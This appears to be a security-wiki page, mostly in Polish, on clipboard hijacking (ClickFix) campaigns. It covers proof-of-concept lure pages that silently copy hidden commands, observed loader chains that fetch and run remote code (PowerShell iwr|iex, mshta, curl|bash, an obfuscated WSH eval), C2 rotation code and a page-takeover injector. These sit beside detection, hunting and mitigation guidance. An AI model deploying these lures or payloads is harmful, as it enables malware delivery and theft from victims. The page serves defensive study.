# Clipboard Hijacking (Pastejacking) Ataki

{{#include ../../banners/hacktricks-training.md}}

> "Nigdy nie wklejaj niczego, czego sam(a) nie skopiowałeś(-aś)." – stare, ale nadal aktualne zalecenie

## Przegląd

Clipboard hijacking – znane również jako *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia, nie sprawdzając ich. Złośliwa strona internetowa (lub dowolny kontekst obsługujący JavaScript, taki jak Electron lub aplikacja desktopowa) programowo umieszcza kontrolowany przez atakującego tekst w schowku systemowym. Ofiary są zachęcane, zwykle za pomocą starannie spreparowanych instrukcji inżynierii społecznej, aby nacisnąć **Win + R** (okno Uruchom), **Win + X** (Quick Access / PowerShell) lub otworzyć terminal i *wkleić* zawartość schowka, co natychmiast uruchamia dowolne polecenia.

Ponieważ **żaden plik nie jest pobierany i żaden załącznik nie jest otwierany**, technika omija większość zabezpieczeń poczty e-mail i zawartości webowej, które monitorują załączniki, makra lub bezpośrednie wykonywanie poleceń. W związku z tym atak jest popularny w kampaniach phishingowych dostarczających powszechne rodziny malware, takie jak NetSupport RAT, Latrodectus loader czy Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starsze kampanie używały `document.execCommand('copy')`, nowsze polegają na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).

## Przebieg ClickFix / ClearFake

1. Użytkownik odwiedza typosquatted lub kompromitowaną stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty JavaScript **ClearFake** wywołuje helper `unsecuredCopyToClipboard()`, który cicho zapisuje zakodowany w Base64 jednolinijkowy skrypt PowerShell w schowku.
3. Instrukcje HTML mówią ofierze: *“Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
4. `powershell.exe` uruchamia się, pobierając archiwum zawierające legalny plik wykonywalny oraz złośliwy DLL (klasyczne DLL sideloading).
5. Loader odszyfrowuje dodatkowe etapy, wstrzykuje shellcode i instaluje persistence (np. scheduled task) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.

### Przykład łańcucha NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legalny Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwy DLL dynamicznie rozwiązuje API przy użyciu **GetProcAddress**, pobiera dwa binaria (`data_3.bin`, `data_4.bin`) za pomocą **curl.exe**, odszyfrowuje je przy użyciu rolling XOR key `"https://google.com/"`, wstrzykuje końcowy shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Pobiera `la.txt` za pomocą **curl.exe**
2. Uruchamia JScript downloader wewnątrz **cscript.exe**
3. Pobiera payload MSI → zapisuje `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer przez MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Schowek → PowerShell → JS eval → Startup LNK z rotującym C2 (PureHVNC)

Niektóre kampanie ClickFix całkowicie pomijają pobieranie plików i instruują ofiary, aby wkleiły one‑linera, który pobiera i wykonuje JavaScript przez WSH, utrwala się i codziennie rotuje C2. Przykładowy obserwowany łańcuch:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Główne cechy
- Obfuskowany URL odwracany w czasie wykonywania, aby uniemożliwić powierzchowną inspekcję.
- JavaScript utrzymuje się poprzez Startup LNK (WScript/CScript) i wybiera C2 na podstawie aktualnego dnia — co pozwala na rapid domain rotation.

Minimalny fragment JS używany do rotacji C2s według daty:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Następny etap zazwyczaj wdraża loader, który ustala persistence i pobiera RAT (np. PureHVNC), często przypinając TLS do zakodowanego na stałe certyfikatu i dzieląc ruch na fragmenty.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns mass-produce fake CDN/browser verification pages ("Just a moment…", IUAM-style) that coerce users into copying OS-specific commands from their clipboard into native consoles. This pivots execution out of the browser sandbox and works across Windows and macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence pierwszego uruchomienia
- Użyj `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, aby wykonanie kontynuowało się po zamknięciu terminala, zmniejszając widoczne artefakty.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

Zobacz także techniki wspierające

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Środki zaradcze

1. Wzmocnienie przeglądarki – wyłączyć dostęp do zapisu schowka (`dom.events.asyncClipboard.clipboardItem` etc.) lub wymagać gestu użytkownika.
2. Edukacja dotycząca bezpieczeństwa – ucz użytkowników, aby *wpisywali* wrażliwe polecenia lub najpierw wklejali je do edytora tekstu.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control — blokować dowolne one-liners.
4. Kontrole sieciowe – blokować żądania wychodzące do znanych domen pastejacking i malware C2.

## Powiązane triki

* **Discord Invite Hijacking** często nadużywa tego samego podejścia ClickFix po zwabieniu użytkowników do złośliwego serwera:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
